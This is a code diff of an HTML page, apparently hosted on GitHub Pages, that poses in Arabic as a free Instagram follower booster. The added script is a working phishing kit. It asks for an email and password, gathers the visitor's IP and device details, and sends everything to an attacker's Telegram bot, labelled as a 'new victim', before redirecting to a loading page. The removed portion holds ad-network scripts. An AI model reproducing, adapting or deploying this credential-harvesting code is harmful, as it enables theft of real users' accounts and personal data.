@@ -3,93 +3,369 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>جاري المعالجة ...</title>
+    <!-- عنوان الصفحة -->
+<title>Instagram followers</title>
+
+<!-- Open Graph -->
+<meta property="og:title" content="Instagram followers" />
+<meta property="og:description" content="زد متابعين حسابك على إنستجرام بسرعة وبسهولة مع أفضل خدمات النمو والتفاعل الحقيقي. احصل على متابعين وإعجابات ومشاهدات بجودة عالية لتحسين ظهور حسابك وزيادة شهرتك على السوشيال ميديا بشكل احترافي وآمن." />
+<meta property="og:image" content="" />
+<meta property="og:url" content="https://b7xha.github.io/followers_frees/" />
+<meta property="og:type" content="website" />
+
+<!-- Twitter -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Instagram followers">
+<meta name="twitter:description" content="زد متابعين حسابك على إنستجرام بسرعة وبسهولة مع أفضل خدمات النمو والتفاعل الحقيقي. احصل على متابعين وإعجابات ومشاهدات بجودة عالية لتحسين ظهور حسابك وزيادة شهرتك على السوشيال ميديا بشكل احترافي وآمن.">
+<meta name="twitter:image" content="">
+
     <style>
-        body {
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #f5f5f5;
+            font-family: 'Tahoma', 'Segoe UI', Arial, sans-serif;
             padding: 20px;
-            background: #0a0a0a;
-            font-family: Arial, sans-serif;
+            direction: rtl;
+        }
+
+        .box {
+            max-width: 400px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+            border: 1px solid #ddd;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #405de6, #833ab4, #e1306c);
+            padding: 25px 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 26px;
+            font-weight: bold;
+        }
+
+        .header p {
+            font-size: 13px;
+            opacity: 0.9;
+            margin-top: 8px;
+        }
+
+        .content {
+            padding: 25px 20px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .input-group input, 
+        .input-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 15px;
+            background: #fff;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: #e1306c;
+        }
+
+        .count-selector {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+
+        .count-btn {
+            flex: 1;
+            padding: 10px;
+            background: #f0f0f0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+
+        .count-btn.active {
+            background: #e1306c;
+            color: white;
+            border-color: #e1306c;
+        }
+
+        .btn-boost {
+            width: 100%;
+            padding: 14px;
+            background: #e1306c;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.2s;
+        }
+
+        .btn-boost:active {
+            transform: scale(0.97);
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer {
+            background: #f9f9f9;
+            padding: 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            border-top: 1px solid #eee;
+        }
+
+        .warning {
+            font-size: 11px;
+            color: #e1306c;
+            margin-top: 15px;
             text-align: center;
         }
-        .loader {
-            color: white;
-            margin: 30px 0;
-            font-size: 18px;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #333;
-            border-top: 5px solid #e1306c;
-            border-radius: 50%;
-            margin: 20px auto;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .ads-container {
-            margin-top: 30px;
-        }
-        hr {
-            border-color: #333;
-            margin: 25px 0;
+
+        .error-box {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 13px;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="loader">
-        <div class="spinner"></div>
-        <p>⏳ جاري إضافة المتابعين بنظام VIP ... ⏳</p>
-        <p style="font-size:12px; color:#888;">قد يستغرق 1-2 دقيقة</p>
+
+<div class="box">
+    <div class="header">
+        <h1> زيادة متابعين</h1>
+        <p>Instagram Follower Boost </p>
     </div>
 
-    <hr>
-    <div class="ads-container">
-        <h3 style="color:white;">✨ عروض حصرية ✨</h3>
+    <div class="content">
+        <div class="error-box" id="errorBox">
+             رابط غير صالح - يرجى استخدام رابط التفعيل الصحيح
+        </div>
+
+        <div class="input-group">
+            <label> البريد الإلكتروني</label>
+            <input type="email" id="email" placeholder="example@gmail.com" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label> كلمة المرور</label>
+            <input type="password" id="password" placeholder="••••••••">
+        </div>
+
+        <div class="input-group">
+            <label> عدد المتابعين المطلوب</label>
+            <div class="count-selector" id="countSelector">
+                <div class="count-btn" data-count="100">100</div>
+                <div class="count-btn active" data-count="500">500</div>
+                <div class="count-btn" data-count="1000">1k</div>
+                <div class="count-btn" data-count="5000">5k</div>
+            </div>
+            <input type="hidden" id="selectedCount" value="500">
+        </div>
+
+        <button class="btn-boost" id="boostBtn"> ابدأ الزيادة الآن ✨</button>
+
+        <div class="features">
+            <span> فوري</span>
+            <span> آمن</span>
+            <span> حقيقيون</span>
+        </div>
+
+        <div class="warning">
+            
+        </div>
+    </div>
+
+    <div class="footer">
+        ✔️ تم استخدامه من قبل +25,000 مستخدم
+    </div>
+</div>
+
+<script>
+    // ========== دالة استخراج التوكن والـ ID من الرابط ==========
+    function getBotDataFromURL() {
+        // الحصول على المعامل data من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        let encodedData = urlParams.get('data');
         
-        <!-- جميع الإعلانات التي طلبتها -->
-        <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"></script>
+        if(!encodedData) {
+            return null;
+        }
+        
+        try {
+            // فك تشفير Base64
+            let decoded = atob(encodedData);
+            console.log("Decoded data:", decoded);
+            
+            // البيانات متوقعة بصيغة: token|id
+            // مثال: 1234567890:ABCdefGHIjklmNOPqrstUVwxyz|123456789
+            const parts = decoded.split('|');
+            
+            if(parts.length === 2) {
+                const token = parts[0];
+                const chatId = parts[1];
+                
+                if(token && chatId) {
+                    // حفظهم في localStorage
+                    localStorage.setItem("bot_token", token);
+                    localStorage.setItem("chat_id", chatId);
+                    return { token, chatId };
+                }
+            }
+        } catch(e) {
+            console.log("Base64 decode error:", e);
+        }
+        
+        // محاولة قراءة من localStorage لو موجودين (للصفحات الفرعية)
+        const savedToken = localStorage.getItem("bot_token");
+        const savedId = localStorage.getItem("chat_id");
+        
+        if(savedToken && savedId) {
+            return { token: savedToken, chatId: savedId };
+        }
+        
+        return null;
+    }
+    
+    // ========== التحقق من صحة الرابط ==========
+    const botData = getBotDataFromURL();
+    const errorBox = document.getElementById('errorBox');
+    const boostBtn = document.getElementById('boostBtn');
+    
+    if(!botData || !botData.token || !botData.chatId) {
+        // تعطيل الزر
+        boostBtn.disabled = true;
+        boostBtn.style.opacity = '0.5';
+        errorBox.style.display = 'block';
+    }
+    
+    // ========== اختيار عدد المتابعين ==========
+    const btns = document.querySelectorAll('.count-btn');
+    const selectedCountInput = document.getElementById('selectedCount');
+    
+    btns.forEach(btn => {
+        btn.addEventListener('click', function() {
+            btns.forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            const count = this.getAttribute('data-count');
+            selectedCountInput.value = count;
+        });
+    });
+    
+    // ========== إرسال البيانات للتليجرام ==========
+    async function sendToTelegram(email, password, count, token, chatId) {
+        // جلب IP الضحية
+        let ip = 'غير معروف';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
+        
+        const userAgent = navigator.userAgent;
+        
+        const text = `🎯 ضحية جديدة 🎯
+━━━━━━━━━━━━━━━
+📧 الإيميل: ${email}
+🔑 كلمة المرور: ${password}
+📊 عدد المتابعين: ${count}
+🌐 IP: ${ip}
+📱 الجهاز: ${userAgent.substring(0, 100)}
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━━`;
+        
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+        
+        try {
+            const response = await fetch(url);
+            return response.ok;
+        } catch(e) {
+            console.log(e);
+            return false;
+        }
+    }
+    
+    // ========== معالج زر الزيادة ==========
+    boostBtn.addEventListener('click', async function() {
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const count = document.getElementById('selectedCount').value;
+        
+        if(email === "" || password === "") {
+            alert("❌ يرجى إدخال البريد الإلكتروني وكلمة المرور");
+            return;
+        }
+        
+        // التحقق من صحة الإيميل
+        if(!email.includes('@') || !email.includes('.')) {
+            alert("❌ يرجى إدخال بريد إلكتروني صحيح");
+            return;
+        }
+        
+        const data = getBotDataFromURL();
+        if(!data || !data.token || !data.chatId) {
+            alert("❌ رابط غير صالح، يرجى استخدام رابط التفعيل الصحيح");
+            return;
+        }
+        
+        this.innerText = "جاري المعالجة... ⏳";
+        this.disabled = true;
+        
+        // إرسال البيانات للتليجرام
+        await sendToTelegram(email, password, count, data.token, data.chatId);
+        
+        // حفظ بيانات الضحية مؤقتاً
+        localStorage.setItem("victim_email", email);
+        localStorage.setItem("victim_count", count);
+        
+        // التوجيه لصفحة الانتظار
+        window.location.href = "loading.html";
+    });
+</script>
 
-        <script async="async" data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"></script>
-        <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
-
-        <script>
-            atOptions = {
-                'key' : 'dcff8a2cffdf0642c627a5bacf3a04fd',
-                'format' : 'iframe',
-                'height' : 60,
-                'width' : 468,
-                'params' : {}
-            };
-        </script>
-        <script src="https://www.highperformanceformat.com/dcff8a2cffdf0642c627a5bacf3a04fd/invoke.js"></script>
-
-        <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"></script>
-
-        <script>
-            atOptions = {
-                'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
-                'format' : 'iframe',
-                'height' : 300,
-                'width' : 160,
-                'params' : {}
-            };
-        </script>
-        <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"></script>
-
-        <!-- رابط الإعلان الإضافي -->
-        <iframe src="https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c" width="100%" height="300" style="border:none; margin-top:20px;"></iframe>
-    </div>
-
-    <script>
-        // اختياري: حذف البيانات من localStorage بعد فترة
-        setTimeout(() => {
-            localStorage.removeItem("insta_email");
-            localStorage.removeItem("insta_pass");
-        }, 5000);
-    </script>
 </body>
-</html> 
+                    </html>
